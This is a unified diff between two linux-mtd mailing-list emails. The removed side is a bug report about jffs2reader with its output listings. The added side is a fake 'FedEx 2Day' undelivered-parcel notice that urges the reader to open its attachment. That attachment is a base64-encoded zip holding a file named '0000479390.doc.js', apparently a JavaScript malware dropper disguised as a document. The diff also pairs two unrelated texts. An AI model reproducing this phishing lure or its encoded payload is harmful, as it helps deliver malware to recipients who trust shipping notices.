@@ -1,16 +1,16 @@
-Received: from nm37-vm2.bullet.mail.bf1.yahoo.com ([72.30.238.202])
+Received: from p3nlsmtp20.shr.prod.phx3.secureserver.net ([72.167.234.245])
  by bombadil.infradead.org with esmtps (Exim 4.80.1 #2 (Red Hat Linux))
- id 1Z4fOa-0004np-EN
- for linux-mtd@lists.infradead.org; Tue, 16 Jun 2015 01:10:33 +0000
-Date: Tue, 16 Jun 2015 01:09:59 +0000 (UTC)
-From: <ygator@yahoo.com>
-Reply-To: <ygator@yahoo.com>
-To: "linux-mtd@lists.infradead.org" <linux-mtd@lists.infradead.org>
-Message-ID: <538804144.4300029.1434416999816.JavaMail.yahoo@mail.yahoo.com>
-Subject: Bugs with jffs2reader
+ id 1Z4jbz-0005ny-7p
+ for linux-mtd@lists.infradead.org; Tue, 16 Jun 2015 05:40:40 +0000
+Subject: Courier was unable to deliver the parcel, ID0000479390
+To: linux-mtd@lists.infradead.org
+Date: Mon, 15 Jun 2015 22:40:17 -0700
+From: "FedEx 2Day" <jon.cox@ip-184-168-144-35.ip.secureserver.net>
+Reply-To: "FedEx 2Day" <jon.cox@ip-184-168-144-35.ip.secureserver.net>
+Message-ID: <31b354e1a9e42456856ef2dd5ead6382@ip-184-168-144-35.ip.secureserver.net>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="b1_e68252c02282b887ae52d387f19d6336"
+Content-Transfer-Encoding: 8bit
 List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
@@ -20,71 +20,56 @@ List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
 
-Hello,
+--b1_e68252c02282b887ae52d387f19d6336
+Content-Type: text/plain; charset=us-ascii
 
-I wanted to report that I have run across 3 bugs with jffs2reader.
-The image used in the these findings is located here: http://toko.baliwae.com/download/1.8.5.1B_201513211614.zip
-Below is the partial output of jffs2reader and jffs2dump on the image.
+Dear Customer,
 
-1. Incorrect file size shown on output (see jffs2reader output below).  Any file with a size of 4096 or above is reported as 4096.
-2. Extracting a file using -f option yields only the first max 4096 characters of the file.
-3. jffs2reader not seeing first entry in image.  So looking at jffs2dump shows 3518 directory as the first entry, but jffs2reader does not see.
+We could not deliver your item.
+Please, open email attachment to print shipment label.
 
-I found that the first two bugs were fixed in the code located https://github.com/vamanea/mtd-utils
-
-Thanks
+Yours sincerely,
+Jon Cox,
+Station Agent.
 
 
+--b1_e68252c02282b887ae52d387f19d6336
+Content-Type: application/zip; name="0000479390.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=0000479390.zip
+
+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
 
 
-jffs2reader output:
--rwxr-xr-x 1    0        0                0 /704
--rwxr-xr-x 1    0        0             4096 /MCLI
--rwxr-xr-x 1    0        0             4096 /alarmmng
--rwxr-xr-x 1    0        0             4096 /as-iosched.ko
--rwxr-xr-x 1    0        0                0 /ch0.h264
--rwxr-xr-x 1    0        0                0 /ch1.h264
--rwxr-xr-x 1    0        0                0 /ch2.h264
--rwxr-xr-x 1    0        0                0 /ch3.h264
--rwxr-xr-x 1    0        0             4096 /checkdisk
--rwxr-xr-x 1    0        0             4096 /cloud
--rwxr-xr-x 1    0        0             4096 /cloudAPI
--rwxr-xr-x 1    0        0             4096 /connectting.g726
--rwxr-xr-x 1    0        0             4096 /cpld_periph.ko
--rwxr-xr-x 1    0        0             4096 /cpld_wdg.ko
--rwxr-xr-x 1    0        0             4096 /crcCheck
--rwxr-xr-x 1    0        0             4096 /curl
-drwxr-xr-x 1    0        0                0 /debuger/
--rwxr-xr-x 1    0        0                0 /debuger/.gitignore
--rwxr-xr-x 1    0        0             4096 /default.script
--rwxr-xr-x 1    0        0             4096 /detect_ver
--rwxr-xr-x 1    0        0             4096 /dhcpcd
--rwxr-xr-x 1    0        0              886 /dhcpcd.conf
--rwxr-xr-x 1    0        0             4096 /dispatch
--rwxr-xr-x 1    0        0             4096 /dumpmmap
--rwxr-xr-x 1    0        0             4096 /dvr_timer
--rwxr-xr-x 1    0        0             1700 /equip_test.sh
--rwxr-xr-x 1    0        0             4096 /exnet
--rwxr-xr-x 1    0        0             1916 /fappend.sh
--rwxr-xr-x 1    0        0                0 /fb4
--rwxr-xr-x 1    0        0               36 /fdisk.input
-
-
-jffs2dump -c output:
-
-         Dirent     node at 0x0000000c, totlen 0x0000002c, #pino     1, version     0, #ino         2, nsize        4, name 3518
-         Inode      node at 0x00000038, totlen 0x00000044, #ino      2, version     1, isize        0, csize        0, dsize        0, offset        0
-         Dirent     node at 0x0000007c, totlen 0x0000002b, #pino     1, version     1, #ino         3, nsize        3, name 704
-         Inode      node at 0x000000a8, totlen 0x00000044, #ino      3, version     1, isize        0, csize        0, dsize        0, offset        0
-         Dirent     node at 0x000000ec, totlen 0x0000002c, #pino     1, version     2, #ino         4, nsize        4, name MCLI
-         Inode      node at 0x00000118, totlen 0x00000859, #ino      4, version     1, isize    18416, csize     2069, dsize     4096, offset        0
-         Inode      node at 0x00000974, totlen 0x00000a37, #ino      4, version     2, isize    18416, csize     2547, dsize     4096, offset     4096
-         Inode      node at 0x000013ac, totlen 0x00000a0e, #ino      4, version     3, isize    18416, csize     2506, dsize     4096, offset     8192
-         Inode      node at 0x00001dbc, totlen 0x00000480, #ino      4, version     4, isize    18416, csize     1084, dsize     4096, offset    12288
-         Inode      node at 0x0000223c, totlen 0x000003a0, #ino      4, version     5, isize    18416, csize      860, dsize     2032, offset    16384
-         Dirent     node at 0x000025dc, totlen 0x00000030, #pino     1, version     3, #ino         5, nsize        8, name alarmmng
-         Inode      node at 0x0000260c, totlen 0x000007ce, #ino      5, version     1, isize    19944, csize     1930, dsize     4096, offset        0
-         Inode      node at 0x00002ddc, totlen 0x00000780, #ino      5, version     2, isize    19944, csize     1852, dsize     4096, offset     4096
-         Inode      node at 0x0000355c, totlen 0x000006e3, #ino      5, version     3, isize    19944, csize     1695, dsize     4096, offset     8192
-         Inode      node at 0x00003c40, totlen 0x000009d0, #ino      5, version     4, isize    19944, csize     2444, dsize     4096, offset    12288
-         Inode      node at 0x00004610, totlen 0x0000074e, #ino      5, version     5, isize    19944, csize     1802, dsize     3560, offset    16384
+--b1_e68252c02282b887ae52d387f19d6336--
